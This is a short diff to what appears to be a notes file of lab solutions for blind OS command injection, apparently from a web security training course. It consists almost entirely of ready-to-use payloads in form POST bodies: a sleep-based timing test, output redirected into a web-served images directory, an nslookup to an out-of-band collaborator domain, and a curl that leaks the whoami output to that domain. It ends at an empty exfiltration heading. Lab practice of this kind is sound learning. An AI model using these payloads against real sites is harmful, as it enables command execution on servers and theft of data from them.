@@ -41,3 +41,18 @@ csrf=MHUzDCRAmx3TG1QrDY2ZLHl2jHKiuHJg&name=test&email=test%40test.com||sleep+10|
 ```bash
 email=carlos@exam.net||curl+`whoami`.ydfdn9eu9fmqnh4l1jbj2ocr0i68ux.oastify.com||
 ```
+
+# Blind OS command injection with output redirection
+
+```bash
+csrf=hEZE4kGjoO0LidGJeSWj0GP6kZ6U8VlG&name=test&email=test%40test.com||whoami+>>+/var/www/images/test.txt||&subject=test&message=test
+```
+
+# Blind OS command injection with out-of-band interaction
+
+```bash
+csrf=JLmVMicftPWmhmy9AjLiFpbrbbTC5mQo&name=test&email=test%40test.com||nslookup+ydfdn9eu9fmqnh4l1jbj2ocr0i68ux.oastify.com||&subject=test&message=test
+```
+## Blind OS command injection with out-of-band data exfiltration
+
+
